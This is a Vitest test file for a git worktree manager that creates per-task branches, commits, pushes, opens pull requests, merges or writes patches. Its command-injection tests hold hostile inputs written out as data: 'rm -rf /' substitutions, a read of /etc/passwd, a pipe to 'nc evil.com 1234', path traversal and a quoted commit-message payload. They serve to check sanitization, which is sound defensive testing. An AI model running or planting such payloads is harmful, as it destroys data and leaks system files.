import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { GitWorktreeManager, WorktreeInfo, CompletionResult } from './worktree-manager.js';
import { Task, TaskId, Priority, TaskStatus } from '../core/domain.js';
import { ConsoleLogger } from '../implementations/logger.js';
import path from 'path';
import fs from 'fs/promises';

// Mock simple-git
const mockGit = {
  status: vi.fn().mockResolvedValue({ current: 'main' }),
  raw: vi.fn(),
  checkout: vi.fn(),
  merge: vi.fn(),
  push: vi.fn()
};

const mockGitInWorktree = {
  status: vi.fn(),
  add: vi.fn().mockResolvedValue(undefined),
  commit: vi.fn().mockResolvedValue(undefined),
  push: vi.fn().mockResolvedValue(undefined),
  raw: vi.fn().mockResolvedValue('')
};

vi.mock('simple-git', () => ({
  simpleGit: vi.fn((dir?: string) => {
    // Return different mock based on whether a directory is specified
    if (dir) {
      return mockGitInWorktree;
    }
    return mockGit;
  })
}));

// Mock fs/promises
vi.mock('fs/promises', () => ({
  default: {
    mkdir: vi.fn(),
    writeFile: vi.fn(),
    readFile: vi.fn(),
    rm: vi.fn()
  },
  mkdir: vi.fn(),
  writeFile: vi.fn(),
  readFile: vi.fn(),
  rm: vi.fn()
}));

// Mock GitHub integration
const mockGitHubIntegration = {
  isAvailable: vi.fn().mockResolvedValue(true),
  createPR: vi.fn().mockResolvedValue({ 
    ok: true, 
    value: 'https://github.com/user/repo/pull/123' 
  })
};

describe('GitWorktreeManager', () => {
  let manager: GitWorktreeManager;
  let logger: ConsoleLogger;

  beforeEach(() => {
    vi.clearAllMocks();
    logger = new ConsoleLogger('test');
    
    // Reset GitHub integration mock
    mockGitHubIntegration.isAvailable.mockResolvedValue(true);
    mockGitHubIntegration.createPR.mockResolvedValue({ 
      ok: true, 
      value: 'https://github.com/user/repo/pull/123' 
    });
    
    // Reset mock implementations
    mockGit.raw.mockResolvedValue('');
    mockGit.status.mockResolvedValue({ current: 'main' });
    mockGit.checkout.mockResolvedValue(undefined);
    mockGit.merge.mockResolvedValue(undefined);
    mockGit.push.mockResolvedValue(undefined);
    
    // Default to clean status
    mockGitInWorktree.status.mockResolvedValue({ 
      isClean: () => true,
      files: [],
      modified: [],
      not_added: [],
      created: [],
      deleted: [],
      renamed: [],
      conflicted: []
    });
    mockGitInWorktree.add.mockResolvedValue(undefined);
    mockGitInWorktree.commit.mockResolvedValue(undefined);
    mockGitInWorktree.push.mockResolvedValue(undefined);
    mockGitInWorktree.raw.mockResolvedValue('');
    
    // Mock worktree list to always be empty
    mockGit.raw.mockImplementation((args: string[]) => {
      if (args[0] === 'worktree' && args[1] === 'list') {
        return Promise.resolve('');
      }
      return Promise.resolve('');
    });
    
    manager = new GitWorktreeManager(logger, mockGitHubIntegration as any);
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe('createWorktree', () => {
    it('should create worktree with branch instead of detached HEAD', async () => {
      const task: Task = {
        id: TaskId('test-123'),
        prompt: 'Test task',
        priority: 'P2' as Priority,
        status: TaskStatus.QUEUED,
        createdAt: Date.now(),
        useWorktree: true,
        autoCommit: true,
        pushToRemote: true
      };

      const result = await manager.createWorktree(task);

      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.value.branch).toMatch(/^claudine\/task-test-123/);
        expect(result.value.baseBranch).toBe('main');
        expect(result.value.path).toContain('task-test-123');
      }

      // Verify git.raw was called with worktree add command
      expect(mockGit.raw).toHaveBeenCalledWith([
        'worktree', 'add',
        '-b', expect.stringMatching(/^claudine\/task-test-123/),
        expect.stringContaining('task-test-123'),
        'main'
      ]);
    });

    it('should use custom branch name when provided', async () => {
      const task: Task = {
        id: TaskId('test-456'),
        prompt: 'Test task',
        priority: 'P2' as Priority,
        status: TaskStatus.QUEUED,
        createdAt: Date.now(),
        useWorktree: true,
        branchName: 'feature/awesome',
        autoCommit: true,
        pushToRemote: true
      };

      const result = await manager.createWorktree(task);

      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.value.branch).toBe('feature/awesome');
      }
      
      // Verify the branch name was used
      expect(mockGit.raw).toHaveBeenCalledWith([
        'worktree', 'add',
        '-b', 'feature/awesome',
        expect.any(String),
        'main'
      ]);
    });

    it('should use custom base branch when provided', async () => {
      const task: Task = {
        id: TaskId('test-789'),
        prompt: 'Test task',
        priority: 'P2' as Priority,
        status: TaskStatus.QUEUED,
        createdAt: Date.now(),
        useWorktree: true,
        baseBranch: 'develop',
        autoCommit: true,
        pushToRemote: true
      };

      const result = await manager.createWorktree(task);

      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.value.baseBranch).toBe('develop');
      }
      
      // Verify the base branch was used
      expect(mockGit.raw).toHaveBeenCalledWith([
        'worktree', 'add',
        '-b', expect.any(String),
        expect.any(String),
        'develop'
      ]);
    });
    
    it('should sanitize branch names to remove dangerous characters', async () => {
      const task: Task = {
        id: TaskId('test-injection'),
        prompt: 'Test task',
        priority: 'P2' as Priority,
        status: TaskStatus.QUEUED,
        createdAt: Date.now(),
        useWorktree: true,
        branchName: 'feature/$(rm -rf /)dangerous',
        autoCommit: true,
        pushToRemote: true
      };

      const result = await manager.createWorktree(task);

      expect(result.ok).toBe(true);
      if (result.ok) {
        // Branch name should be sanitized - slashes are allowed in branch names
        expect(result.value.branch).toBe('feature/--rm--rf-/-dangerous');
      }
    });
  });

  describe('completeTask', () => {
    let worktreeInfo: WorktreeInfo;

    beforeEach(() => {
      worktreeInfo = {
        path: '/tmp/task-test',
        branch: 'claudine/task-test',
        baseBranch: 'main'
      };
    });

    describe('PR merge strategy (default)', () => {
      it('should create pull request by default', async () => {
        const task: Task = {
          id: TaskId('test-pr'),
          prompt: 'Test PR creation',
          priority: 'P2' as Priority,
          status: TaskStatus.QUEUED,
          createdAt: Date.now(),
          useWorktree: true,
          autoCommit: true,
          pushToRemote: true
          // mergeStrategy is undefined, should default to 'pr'
        };

        // Mock changes exist
        mockGitInWorktree.status.mockResolvedValueOnce({ 
          isClean: () => false,
          files: ['file.txt'],
          modified: ['file.txt'],
          not_added: [],
          created: [],
          deleted: [],
          renamed: [],
          conflicted: []
        });

        const result = await manager.completeTask(task, worktreeInfo);

        expect(result.ok).toBe(true);
        if (result.ok) {
          expect(result.value.action).toBe('pr_created');
          expect(result.value.prUrl).toBe('https://github.com/user/repo/pull/123');
        }
      });

      it('should push branch and create PR with GitHub integration', async () => {
        const task: Task = {
          id: TaskId('test-pr-2'),
          prompt: 'Test PR with custom title',
          priority: 'P2' as Priority,
          status: TaskStatus.QUEUED,
          createdAt: Date.now(),
          useWorktree: true,
          mergeStrategy: 'pr',
          prTitle: 'Custom PR Title',
          prBody: 'Custom PR description',
          autoCommit: true,
          pushToRemote: true
        };

        const result = await manager.completeTask(task, worktreeInfo);

        expect(result.ok).toBe(true);
        
        // Check that git push was called
        expect(mockGitInWorktree.push).toHaveBeenCalledWith(
          ['origin', worktreeInfo.branch, '--set-upstream']
        );
        
        // Check that GitHub integration was called
        expect(mockGitHubIntegration.createPR).toHaveBeenCalledWith({
          title: 'Custom PR Title',
          body: 'Custom PR description',
          baseBranch: 'main',
          cwd: worktreeInfo.path
        });
      });
    });

    describe('Auto-merge strategy', () => {
      it('should automatically merge changes without conflicts', async () => {
        const task: Task = {
          id: TaskId('test-auto'),
          prompt: 'Test auto-merge',
          priority: 'P2' as Priority,
          status: TaskStatus.QUEUED,
          createdAt: Date.now(),
          useWorktree: true,
          mergeStrategy: 'auto',
          autoCommit: true,
          pushToRemote: false
        };

        const result = await manager.completeTask(task, worktreeInfo);

        expect(result.ok).toBe(true);
        if (result.ok) {
          expect(result.value.action).toBe('merged');
          expect(result.value.branch).toBe('claudine/task-test');
        }

        // Verify merge command was called
        expect(mockGit.merge).toHaveBeenCalledWith([
          worktreeInfo.branch,
          '--no-ff',
          '-m', `Auto-merge: ${worktreeInfo.branch}`
        ]);
      });

      it('should handle merge conflicts gracefully', async () => {
        const task: Task = {
          id: TaskId('test-conflict'),
          prompt: 'Test merge conflict',
          priority: 'P2' as Priority,
          status: TaskStatus.QUEUED,
          createdAt: Date.now(),
          useWorktree: true,
          mergeStrategy: 'auto',
          autoCommit: true,
          pushToRemote: false
        };

        // Simulate merge conflict
        mockGit.merge.mockRejectedValueOnce(new Error('Merge conflict'));
        
        const result = await manager.completeTask(task, worktreeInfo);

        expect(result.ok).toBe(false);
        if (!result.ok) {
          expect(result.error.message).toContain('Auto-merge failed');
        }

        // Should restore original branch
        expect(mockGit.checkout).toHaveBeenCalledWith('main');
      });
    });

    describe('Manual strategy', () => {
      it('should push branch for manual review', async () => {
        const task: Task = {
          id: TaskId('test-manual'),
          prompt: 'Test manual review',
          priority: 'P2' as Priority,
          status: TaskStatus.QUEUED,
          createdAt: Date.now(),
          useWorktree: true,
          mergeStrategy: 'manual',
          autoCommit: true,
          pushToRemote: true
        };

        const result = await manager.completeTask(task, worktreeInfo);

        expect(result.ok).toBe(true);
        if (result.ok) {
          expect(result.value.action).toBe('branch_pushed');
          expect(result.value.branch).toBe('claudine/task-test');
        }

        // Verify push was called but not PR creation
        expect(mockGitInWorktree.push).toHaveBeenCalledWith(
          ['origin', worktreeInfo.branch, '--set-upstream']
        );
        expect(mockGitHubIntegration.createPR).not.toHaveBeenCalled();
      });
    });

    describe('Patch strategy', () => {
      it('should create patch file', async () => {
        const task: Task = {
          id: TaskId('test-patch'),
          prompt: 'Test patch creation',
          priority: 'P2' as Priority,
          status: TaskStatus.QUEUED,
          createdAt: Date.now(),
          useWorktree: true,
          mergeStrategy: 'patch',
          autoCommit: true,
          pushToRemote: false
        };

        // Mock format-patch output
        mockGitInWorktree.raw.mockResolvedValueOnce('patch content');

        const result = await manager.completeTask(task, worktreeInfo);

        expect(result.ok).toBe(true);
        if (result.ok) {
          expect(result.value.action).toBe('patch_created');
          expect(result.value.patchPath).toContain('test-patch.patch');
        }

        // Verify format-patch was called
        expect(mockGitInWorktree.raw).toHaveBeenCalledWith([
          'format-patch',
          `${worktreeInfo.baseBranch}..HEAD`,
          '--stdout'
        ]);
      });
    });

    describe('Auto-commit behavior', () => {
      it('should commit changes when autoCommit is true', async () => {
        const task: Task = {
          id: TaskId('test-commit'),
          prompt: 'Test auto commit',
          priority: 'P2' as Priority,
          status: TaskStatus.QUEUED,
          createdAt: Date.now(),
          useWorktree: true,
          mergeStrategy: 'pr',
          autoCommit: true,
          pushToRemote: true
        };

        // Mock that changes exist
        mockGitInWorktree.status.mockResolvedValueOnce({ 
          isClean: () => false,
          files: ['file.txt'],
          modified: ['file.txt'],
          not_added: [],
          created: [],
          deleted: [],
          renamed: [],
          conflicted: []
        });

        await manager.completeTask(task, worktreeInfo);

        // Verify git add and commit were called
        expect(mockGitInWorktree.add).toHaveBeenCalledWith('.');
        expect(mockGitInWorktree.commit).toHaveBeenCalled();
      });

      it('should not commit when autoCommit is false', async () => {
        const task: Task = {
          id: TaskId('test-no-commit'),
          prompt: 'Test no auto commit',
          priority: 'P2' as Priority,
          status: TaskStatus.QUEUED,
          createdAt: Date.now(),
          useWorktree: true,
          mergeStrategy: 'pr',
          autoCommit: false,
          pushToRemote: true
        };

        await manager.completeTask(task, worktreeInfo);

        // Verify commit was NOT called
        expect(mockGitInWorktree.commit).not.toHaveBeenCalled();
      });
    });
  });

  describe('removeWorktree', () => {
    it('should remove worktree and clean up', async () => {
      const taskId = TaskId('test-remove');
      
      // First create a worktree to track it
      const task: Task = {
        id: taskId,
        prompt: 'Test removal',
        priority: 'P2' as Priority,
        status: TaskStatus.QUEUED,
        createdAt: Date.now(),
        useWorktree: true,
        autoCommit: true,
        pushToRemote: false
      };
      
      await manager.createWorktree(task);
      
      const result = await manager.removeWorktree(taskId);

      expect(result.ok).toBe(true);

      // Verify remove command was called
      expect(mockGit.raw).toHaveBeenCalledWith([
        'worktree', 'remove',
        expect.stringContaining('test-remove'),
        '--force'
      ]);
    });

    it('should handle removal of non-existent worktree gracefully', async () => {
      const result = await manager.removeWorktree(TaskId('non-existent'));
      expect(result.ok).toBe(true); // Should succeed silently
    });
  });
  
  describe('Command Injection Prevention', () => {
    it('should prevent command injection in branch names', async () => {
      const maliciousInputs = [
        '$(rm -rf /)',
        '`cat /etc/passwd`',
        '; rm -rf /',
        '&& echo hacked',
        '| nc evil.com 1234',
        '../../../etc/passwd'
      ];
      
      for (const input of maliciousInputs) {
        const task: Task = {
          id: TaskId('test-security'),
          prompt: 'Test task',
          priority: 'P2' as Priority,
          status: TaskStatus.QUEUED,
          createdAt: Date.now(),
          useWorktree: true,
          branchName: input,
          autoCommit: true,
          pushToRemote: true
        };
        
        const result = await manager.createWorktree(task);
        
        expect(result.ok).toBe(true);
        if (result.ok) {
          // Branch name should be sanitized - no shell metacharacters
          expect(result.value.branch).not.toContain('$');
          expect(result.value.branch).not.toContain('`');
          expect(result.value.branch).not.toContain(';');
          expect(result.value.branch).not.toContain('&');
          expect(result.value.branch).not.toContain('|');
          expect(result.value.branch).not.toContain('..');
        }
        
        // Verify raw git command was called with sanitized branch
        const calls = mockGit.raw.mock.calls;
        const lastCall = calls[calls.length - 1];
        expect(lastCall[0]).toEqual([
          'worktree', 'add',
          '-b', expect.not.stringContaining('$'),
          expect.any(String),
          expect.any(String)
        ]);
      }
    });
    
    it('should prevent command injection in commit messages', async () => {
      const task: Task = {
        id: TaskId('test-commit-injection'),
        prompt: '"; rm -rf / #',
        priority: 'P2' as Priority,
        status: TaskStatus.QUEUED,
        createdAt: Date.now(),
        useWorktree: true,
        autoCommit: true,
        pushToRemote: false,
        mergeStrategy: 'manual'
      };
      
      const worktreeInfo: WorktreeInfo = {
        path: '/tmp/task-test',
        branch: 'safe-branch',
        baseBranch: 'main'
      };
      
      // Mock changes exist
      mockGitInWorktree.status.mockResolvedValueOnce({ 
        isClean: () => false,
        files: ['file.txt'],
        modified: ['file.txt'],
        not_added: [],
        created: [],
        deleted: [],
        renamed: [],
        conflicted: []
      });
      
      const result = await manager.completeTask(task, worktreeInfo);
      
      expect(result.ok).toBe(true);
      
      // Verify commit was called with array args (safe from injection)
      expect(mockGitInWorktree.commit).toHaveBeenCalled();
      // simple-git handles escaping internally when using the library methods
    });
  });
});